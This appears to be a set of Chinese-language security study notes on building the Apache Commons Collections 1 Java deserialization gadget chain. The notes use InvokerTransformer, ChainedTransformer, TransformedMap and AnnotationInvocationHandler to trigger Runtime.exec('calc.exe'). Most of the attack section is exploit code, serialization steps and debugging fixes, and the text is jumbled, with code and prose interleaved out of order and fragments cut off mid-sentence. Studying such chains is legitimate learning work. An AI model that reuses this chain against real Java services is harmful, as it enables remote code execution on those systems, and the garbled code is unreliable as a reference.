CommonCollection1
InvokeTransformer
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//
package org.apache.commons.collections.functors;
import java.io.Serializable;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import org.apache.commons.collections.FunctorException;
import org.apache.commons.collections.Transformer;
public class InvokerTransformer implements Transformer, Serializable {
    static final long serialVersionUID = -8653385846894047688L;
    private final String iMethodName;
    private final Class[] iParamTypes;
    private final Object[] iArgs;
    public static Transformer getInstance(String methodName) {
        if (methodName == null) {
            throw new IllegalArgumentException("The method to invoke must not be 
null");
        } else {
            return new InvokerTransformer(methodName);
        }
    }
    public static Transformer getInstance(String methodName, Class[] paramTypes, 
Object[] args) {
        if (methodName == null) {
            throw new IllegalArgumentException("The method to invoke must not be 
null");
        } else if (paramTypes == null && args != null || paramTypes != null && 
args == null || paramTypes != null && args != null && paramTypes.length != 
args.length) {
            throw new IllegalArgumentException("The parameter types must match 
the arguments");
        } else if (paramTypes != null && paramTypes.length != 0) {
            paramTypes = (Class[])paramTypes.clone();
            args = (Object[])args.clone();
            return new InvokerTransformer(methodName, paramTypes, args);
        } else {
            return new InvokerTransformer(methodName);
        }
    }
    private InvokerTransformer(String methodName) {
        this.iMethodName = methodName;
        this.iParamTypes = null;
这是一个单例模式设计的类，通过transform方法使用反射执行代码。传入参数为一个对象。 
        this.iArgs = null;
    }
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] 
args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }
    public Object transform(Object input) {
        if (input == null) {
            return null;
        } else {
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, 
this.iParamTypes);
                return method.invoke(input, this.iArgs);
            } catch (NoSuchMethodException var5) {
                throw new FunctorException("InvokerTransformer: The method '" + 
this.iMethodName + "' on '" + input.getClass() + "' does not exist");
            } catch (IllegalAccessException var6) {
                throw new FunctorException("InvokerTransformer: The method '" + 
this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            } catch (InvocationTargetException var7) {
                throw new FunctorException("InvokerTransformer: The method '" + 
this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
            }
        }
    }
}
、
调用方式：
        InvokerTransformer invokerTransformer = new 
InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"});
        invokerTransformer.transform(Runtime.getRuntime());
之后尝试搜索有什么地方调用了 invokeTransformer.transform 方法，同搜索 transform 关键字，找
到几处：
构造链中使用的是 ChainedTransformer ，这里的 SwitchTransformer 也有 ChainedTransformer 的
特点，不过多追加了一个判断。
通过 ChainedTransformer 调用 InvokeTransformer 执行命令：
        InvokerTransformer invokerTransformer = new 
InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"});
       // invokerTransformer.transform(Runtime.getRuntime());
        Transformer[] transformers={
            new ConstantTransformer(Runtime.getRuntime()),//ConstantTransformer传
进去一个对象，然后通过transform返回传进去的对象。这样在chainedTransformer链中就不需要传入一
个对象。
            invokerTransformer};
//        Transformer[] transformers=new Transformer[]{
//            new ConstantTransformer(Runtime.getRuntime()),
//            new InvokerTransformer("exec", new Class[]{String.class},new 
Object[]{"calc.exe"}),
//        };
        ChainedTransformer chainedTransformer = new 
ChainedTransformer(transformers);
        chainedTransformer.transform("");
此处 ConstantTransformer 类的作用是自动返回一个对象。 
TransformedMap
TransformedMap 用于对Java标准数据结构Map做一个修饰，被修饰过的Map在添加新的元素时，将可
以执行一个回调。我们通过下面这行代码对innerMap进行修饰，传出的 outerMap 即是修饰后的Map： 
通过static方法创建一个 TransformedMap 对象，其中， keyTransformer 或者 valueTransformer 属
性就是回调方法，之后调用 put 方法存储数据，会进行数据整理，第71，72行就调用 transformKey 或
transformValue 方法，然后调用回调方法。 
完整的代码：
public static void main(String[] args) throws Exception {
        InvokerTransformer invokerTransformer = new 
InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"});
       // invokerTransformer.transform(Runtime.getRuntime());
        Transformer[] transformers={
            new ConstantTransformer(Runtime.getRuntime()),//ConstantTransformer传
进去一个对象，然后通过transform返回传进去的对象。这样在chainedTransformer链中就不需要传入一
个对象。
            invokerTransformer};
//        Transformer[] transformers=new Transformer[]{
//            new ConstantTransformer(Runtime.getRuntime()),
//            new InvokerTransformer("exec", new Class[]{String.class},new 
Object[]{"calc.exe"}),
到此触发代码执行的逻辑已经完全清楚了，我们的`demo`中核心部分就在向`outermap`中添加一个
新的原素。
因此要找到一个`readObject`方法能够自动执行这个添加元素的操作，从而触发反序列化。
如何执行outerMap.put--
AnnotationInvocationHandler
//        };
        ChainedTransformer chainedTransformer = new 
ChainedTransformer(transformers);
        //chainedTransformer.transform("");
 //System.out.println(Runtime.getRuntime().getClass().getMethod("exec",String.cl
ass).invoke(Runtime.getRuntime(),"calc.exe"));
        //Runtime.getRuntime().exec()
        Map innerMap=new HashMap();
        Map outerMap= TransformedMap.decorate(innerMap,null,chainedTransformer);
        outerMap.put("test","xxx");  //调用的是TransformedMap类中的put方法。
    }
public class CommonCollections3 {
    public static void main(String[] args) throws Exception {
        InvokerTransformer invokerTransformer = new 
InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"});
       // invokerTransformer.transform(Runtime.getRuntime());
        Transformer[] transformers={
            new ConstantTransformer(Runtime.getRuntime()),//ConstantTransformer传
进去一个对象，然后通过transform返回传进去的对象。这样在chainedTransformer链中就不需要传入一
个对象。
            invokerTransformer};
//        Transformer[] transformers=new Transformer[]{
//            new ConstantTransformer(Runtime.getRuntime()),
//            new InvokerTransformer("exec", new Class[]{String.class},new 
Object[]{"calc.exe"}),
//        };
        ChainedTransformer chainedTransformer = new 
ChainedTransformer(transformers);
        //chainedTransformer.transform("");
 //System.out.println(Runtime.getRuntime().getClass().getMethod("exec",String.cl
ass).invoke(Runtime.getRuntime(),"calc.exe"));
        //Runtime.getRuntime().exec()
        Map innerMap=new HashMap();
        Map outerMap= TransformedMap.decorate(innerMap,null,chainedTransformer);
        outerMap.put("test","xxx");  //调用的是TransformedMap类中的put方法。
        Class aClass = 
Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = aClass.getDeclaredConstructor(Class.class, 
Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Retention.class, outerMap);
        ByteArrayOutputStream barr=new ByteArrayOutputStream();
        ObjectOutputStream oos=new ObjectOutputStream(barr);
此处生成序列化流时会报一个错误：
因为 Runtime 类没有实现 serializable 接口，所以这里不能被反序列化。需要简单的修改上面的链：
Runtime 类没有实现 serializable 接口不能反序列化，但是 Class 类实现了，所以我们在
ConstantTransformer 这里传入 Runtime 类的类对象，然后利用 Class类对象 当中的 getMethod 方法
获取到 getRuntime 方法，之后调用 java.lang.reflect.Method 类中的 invoke 方法执行
getRuntime 方法，返回一个 Runtime 对象;
        oos.writeObject(obj);
        oos.close();
    }
}
public static void main(String[] args) throws Exception {
        InvokerTransformer invokerTransformer = new 
InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"});
       // invokerTransformer.transform(Runtime.getRuntime());
//        Transformer[] transformers={
//            new ConstantTransformer(Runtime.getRuntime()),//ConstantTransformer
传进去一个对象，然后通过transform返回传进去的对象。这样在chainedTransformer链中就不需要传入
一个对象。
//            invokerTransformer}; //此处因为Runtime类没有实现serializable接口，所以无
法被反序列化，需要修改链。
        Transformer[] transformers={
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",new Class[]
{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),//通过
InvokerTransformer方法获取getRuntime方法
            new InvokerTransformer("invoke",new Class[]
{Object.class,Object[].class},new Object[]{null,new Object[0]}),  //If the 
underlying method is static, then the specified obj argument is ignored. It may 
be null.
            invokerTransformer,
        };
        ChainedTransformer chainedTransformer = new 
ChainedTransformer(transformers);
        chainedTransformer.transform("");
}
package reflect2;
import java.lang.reflect.Method;
public class calc {
在执行上述修改后的代码，进行序列化时还是会爆出一个错误：
这个错误经过调试之后发现是因为执行 InvokeTransformer 的 transform 对象之后返回的对象类型为
ProcessImpl ，导致 put 方法的 value 值为这个类，而这个类是没有实现接口无法被序列化的。 
解决方法，再传入一个 ConstantTransformer 对象，将值设为1，这样再次调用 tranform 方法时就会
    public static void main(String[] args) throws Exception{
       // Runtime.getRuntime().exec("calc.exe");
                try{
            Object runtime=Class.forName("java.lang.Runtime")
                    .getMethod("getRuntime")   //此次是通过getRuntime方法返回一个
runtime对象。具体内容可见Runtim类
                    .invoke(null); //此处getRuntime是一个静态方法，反射调用不需要传入对
象  //If the underlying method is static, then the specified obj argument is 
ignored. It may be null.
            Class.forName("java.lang.Runtime")
                    .getMethod("exec",String.class)
                    .invoke(runtime,"calc.exe");//
        }catch (Exception e){
            System.out.println(e);
        }
        try{
            Class runtime2=Runtime.class.getClass();
            Method 
method=runtime2.getMethod("getMethod",String.class,Class[].class);
            System.out.println(method);
            Method runtimeObj= (Method) 
method.invoke(Runtime.class,"getRuntime",new Class[0]);
            System.out.println(runtimeObj);
            Object demo1=runtimeObj.invoke(null, new Object[0]);
            System.out.println(demo1);
            Class.forName("java.lang.Runtime")
                    .getMethod("exec",String.class)
                    .invoke(demo1,"calc.exe");
            //method.exec("calc.exe");
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
返回传入的1 
这里有一个点就是，经过上面的构造链计算之后， Map 中的所有键对应的值都会变成1。 
PS：这里有一个点需要注意的，就是关于 innerMap 和 outerMap 的使用 
此处使用 innerMap 首先存入数据，那么 put 数据的时候不会触发构造链，并且不会报上面的错误，并
且下一步只会将 ChainedTransformer 赋值到 outMap 当中。 
一开始使用 outerMap 存放数据，那么在put的时候就会触发构造链，并且会触发上面的报错。
public class CommonCollections3 {
    public static void main(String[] args) throws Exception {
        InvokerTransformer invokerTransformer = new 
InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"});
       // invokerTransformer.transform(Runtime.getRuntime());